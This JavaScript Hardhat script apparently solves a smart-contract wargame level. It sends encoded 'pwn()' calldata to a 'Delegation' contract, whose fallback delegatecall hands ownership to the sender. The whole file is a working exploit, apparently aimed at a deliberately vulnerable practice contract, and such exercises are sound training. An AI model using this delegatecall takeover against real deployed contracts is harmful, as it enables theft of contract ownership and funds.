const hre = require("hardhat");
require("dotenv").config()

async function main() {
    // Fetch account
    const attacker = new hre.ethers.Wallet(process.env.PRIVATE_KEYS, hre.ethers.provider)
    const INSTANCE_ADDRESS = "0x4496b1Bcd86Be1b9164493E53eE25b4D31f444e2";

    // Fetch instance contract
    const Delegate = await hre.ethers.getContractFactory("Delegate");
    const delegation = await hre.ethers.getContractAt("Delegation", INSTANCE_ADDRESS);

    console.log(`Delegation contract fetched at ${delegation.address}`);

    // Attack...
    const data = Delegate.interface.encodeFunctionData("pwn()", []);

    const transactionObj = {
        from: attacker.address,
        to: delegation.address,
        data: data,
        nonce: await attacker.getTransactionCount(),
        gasPrice: await hre.ethers.provider.getGasPrice(),
        gasLimit: 1000000
    };

    const transaction = await attacker.signTransaction(transactionObj);
    await hre.ethers.provider.sendTransaction(transaction);

    console.log(`Attack complete...\n`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});